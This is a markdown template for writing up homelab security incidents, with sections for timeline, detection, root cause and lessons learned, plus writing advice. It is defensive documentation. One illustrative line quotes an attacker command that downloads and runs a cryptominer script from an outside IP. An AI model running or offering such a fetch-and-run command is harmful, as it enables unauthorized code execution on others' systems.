# Incident Template

> Use this template for every new security incident. Consistent structure makes incidents useful as portfolio pieces and makes patterns visible across events over time.

---

## How to Use This Template

1. Copy this file to `Incidents/NINGI-WRITEUP-NNN.md` (increment the number)
2. Fill in each section as you investigate — don't wait until the end
3. The "Lessons Learned" section is the most important for SOC skill development
4. If the incident is portfolio-worthy, also push a write-up to `pagzlol/homelab-security-research`

---

## Template

```markdown
# NINGI-WRITEUP-NNN — [Short Title]

## Summary

| Field | Value |
|-------|-------|
| Incident ID | NINGI-WRITEUP-NNN |
| Date detected | YYYY-MM-DD |
| Host(s) affected | |
| Detection method | (Wazuh alert / manual log review / Discord notification / etc.) |
| Initial access vector | |
| Impact | |
| Resolution | |

---

## Timeline

| Time (AEST) | Event |
|-------------|-------|
| HH:MM | |

---

## What Happened

### Initial Access
[How did the attacker (or anomaly) get in / start?]

### Actions on Objective
[What did they do? Commands run, files accessed, lateral movement?]

### Impact
[What was the actual impact? Data accessed, services disrupted, persistence established?]

---

## Detection

[How was this detected? Which Wazuh rule? Which alert level? How long after the event?]

---

## Response

[What steps were taken? In what order?]

---

## Root Cause

[Why did this happen? What was the underlying condition that made it possible?]

---

## Lessons Learned

1. 
2. 
3. 

---

## Detection Gaps Identified

[What wasn't detected that should have been? New rules or alerts to add?]

---

## Changes Made

[Config changes, new rules, hardening steps taken as a result]

---

## References

- Relevant Wazuh rule IDs:
- Relevant log files:
- External IOCs (IPs, hashes, domains):

---

## Tags
#homelab #incident
```

---

## What Makes a Good Incident Write-Up

### Specificity over vagueness
Bad: "The attacker ran some commands."
Good: "The attacker ran `wget http://45.33.32.156/miner.sh && chmod +x miner.sh && ./miner.sh` within 30 seconds of first login."

### Timeline precision
Exact timestamps from logs are more credible than approximations. Pull them from Wazuh alerts, Cowrie JSON, or syslog.

### Root cause vs symptoms
The cryptominer in `/tmp` is a symptom. The root cause is an exposed webadmin with a weak password. Fix root causes — symptoms will recur if you don't.

### Lessons learned that generalise
Good lessons apply beyond this one incident. "Don't expose admin UIs publicly" is a principle you can apply to every future service you add.

### Detection gap analysis
For every incident: what rule would have caught this earlier? Write it after the fact. This is how real detection engineering works — incidents drive rule improvements.

---

## Tags
#homelab #incident #template
